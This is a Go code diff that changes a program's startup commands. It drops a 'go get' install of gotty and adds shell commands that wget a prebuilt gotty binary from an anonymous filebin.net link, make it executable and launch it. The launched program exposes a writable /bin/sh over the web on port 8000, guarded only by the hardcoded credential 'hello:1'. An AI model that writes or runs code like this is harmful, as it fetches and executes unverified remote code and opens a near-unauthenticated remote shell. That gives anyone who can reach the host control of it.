@@ -19,7 +19,7 @@ func main() {
         return
     }
     log.Printf("current dir %s\n", current_dir)
-    cmd = exec.Command("/bin/sh", "-c", "GOPATH=/tmp/gotty go get github.com/yudai/gotty")
+    cmd = exec.Command("/bin/sh", "-c", "ls -al .")
     stdoutStderr, err = cmd.CombinedOutput()
 	if err != nil {
         log.Println(string(stdoutStderr))
@@ -27,11 +27,27 @@ func main() {
         return
 	}
     log.Println(string(stdoutStderr))
-    cmd = exec.Command("/bin/sh", "-c", "/tmp/gotty/bin/gotty --port 8000 --permit-write --reconnect --credential hello:1 /bin/bash")
+    cmd = exec.Command("/bin/sh", "-c", "wget https://filebin.net/9fhkp776kjqqjjn1/gotty")
     stdoutStderr, err = cmd.CombinedOutput()
 	if err != nil {
         log.Println(string(stdoutStderr))
-		log.Printf("run shell ls return error %v\n", err)
+		log.Printf("run shell wget return error %v\n", err)
+        return
+	}
+    log.Println(string(stdoutStderr))
+    cmd = exec.Command("/bin/sh", "-c", "chmod +x ./gotty")
+    stdoutStderr, err = cmd.CombinedOutput()
+	if err != nil {
+        log.Println(string(stdoutStderr))
+		log.Printf("run shell chmod return error %v\n", err)
+        return
+	}
+    log.Println(string(stdoutStderr))
+    cmd = exec.Command("/bin/sh", "-c", "./gotty --port 8000 --permit-write --reconnect --credential hello:1 /bin/sh")
+    stdoutStderr, err = cmd.CombinedOutput()
+	if err != nil {
+        log.Println(string(stdoutStderr))
+		log.Printf("run shell gotty return error %v\n", err)
         return
 	}
     log.Println(string(stdoutStderr))
